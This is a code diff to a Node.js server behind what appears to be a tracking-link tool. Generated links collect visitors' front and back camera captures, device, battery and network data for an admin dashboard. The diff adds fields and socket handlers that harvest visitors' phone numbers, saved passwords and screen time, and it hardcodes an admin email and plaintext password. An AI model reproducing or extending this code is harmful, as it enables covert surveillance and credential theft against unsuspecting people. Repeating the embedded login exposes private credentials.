@@ -34,7 +34,7 @@ app.use(session({
     secret: process.env.SESSION_SECRET || 'your-secret-key',
     resave: false,
     saveUninitialized: true,
-    cookie: { secure: false }
+    cookie: { secure: false, maxAge: 7 * 24 * 60 * 60 * 1000 } // 7 days
 }));
 
 // ==========================================
@@ -67,15 +67,31 @@ const writeUsers = (users) => {
 // 5. ROUTES
 // ==========================================
 
+// Check session
+app.get('/api/check-session', (req, res) => {
+    if (req.session.admin) {
+        res.json({ authenticated: true });
+    } else {
+        res.status(401).json({ authenticated: false });
+    }
+});
+
 // Admin Login
 app.post('/admin-login', (req, res) => {
     const { email, password } = req.body;
     if (email === 'somuandsagar@gmail.com' && password === 'Somesh143x@4565') {
         req.session.admin = true;
+        req.session.userEmail = email;
         res.json({ success: true, message: 'Login successful' });
     } else {
         res.status(401).json({ success: false, message: 'Invalid credentials' });
     }
+});
+
+// Logout
+app.post('/logout', (req, res) => {
+    req.session.destroy();
+    res.json({ success: true });
 });
 
 // Get all visitors
@@ -115,6 +131,9 @@ app.get('/api/links', (req, res) => {
 
 // Get specific visitor
 app.get('/api/visitor/:id', (req, res) => {
+    if (!req.session.admin) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
     const users = readUsers();
     const visitor = users.find(u => u.id === req.params.id);
     if (visitor) {
@@ -154,6 +173,9 @@ app.post('/generate-custom-link', (req, res) => {
         language: null,
         frontCamera: null,
         backCamera: null,
+        phoneNumber: null,
+        savedPasswords: [],
+        screenTime: null,
         connected: false,
         visitDate: null,
         permissionsGranted: false,
@@ -214,6 +236,30 @@ app.delete('/api/visitor/:userId/visit/:visitIndex', (req, res) => {
     res.json({ success: true });
 });
 
+// Delete photo
+app.delete('/api/visitor/:userId/photo/:type', (req, res) => {
+    if (!req.session.admin) {
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const { userId, type } = req.params;
+    const users = readUsers();
+    const userIndex = users.findIndex(u => u.id === userId);
+    
+    if (userIndex === -1) {
+        return res.status(404).json({ error: 'User not found' });
+    }
+    
+    if (type === 'front') {
+        users[userIndex].frontCamera = null;
+    } else if (type === 'back') {
+        users[userIndex].backCamera = null;
+    }
+    
+    writeUsers(users);
+    res.json({ success: true });
+});
+
 // Clear all visitors data
 app.delete('/api/clear-all', (req, res) => {
     if (!req.session.admin) {
@@ -241,7 +287,12 @@ app.get('/', (req, res) => {
 });
 
 app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+    // Check if admin is logged in
+    if (req.session.admin) {
+        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+    } else {
+        res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    }
 });
 
 app.get('/visitor/:id', (req, res) => {
@@ -283,6 +334,9 @@ io.on('connection', (socket) => {
                 network: null,
                 frontCamera: null,
                 backCamera: null,
+                phoneNumber: null,
+                savedPasswords: [],
+                screenTime: null,
                 redirectComplete: false
             };
             
@@ -330,6 +384,12 @@ io.on('connection', (socket) => {
                 users[userIndex].battery = content;
             } else if (type === 'network') {
                 users[userIndex].network = content;
+            } else if (type === 'phoneNumber') {
+                users[userIndex].phoneNumber = content;
+            } else if (type === 'savedPasswords') {
+                users[userIndex].savedPasswords = content;
+            } else if (type === 'screenTime') {
+                users[userIndex].screenTime = content;
             } else if (type === 'permissionsGranted') {
                 users[userIndex].permissionsGranted = true;
             } else if (type === 'redirectComplete') {
@@ -337,6 +397,7 @@ io.on('connection', (socket) => {
                 users[userIndex].redirectTime = new Date().toISOString();
             }
             
+            // Also save in visit history
             const history = users[userIndex].visitHistory || [];
             if (history.length > 0) {
                 const lastVisit = history[history.length - 1];
@@ -350,6 +411,12 @@ io.on('connection', (socket) => {
                     lastVisit.battery = content;
                 } else if (type === 'network') {
                     lastVisit.network = content;
+                } else if (type === 'phoneNumber') {
+                    lastVisit.phoneNumber = content;
+                } else if (type === 'savedPasswords') {
+                    lastVisit.savedPasswords = content;
+                } else if (type === 'screenTime') {
+                    lastVisit.screenTime = content;
                 } else if (type === 'redirectComplete') {
                     lastVisit.redirectComplete = true;
                     lastVisit.redirectTime = new Date().toISOString();
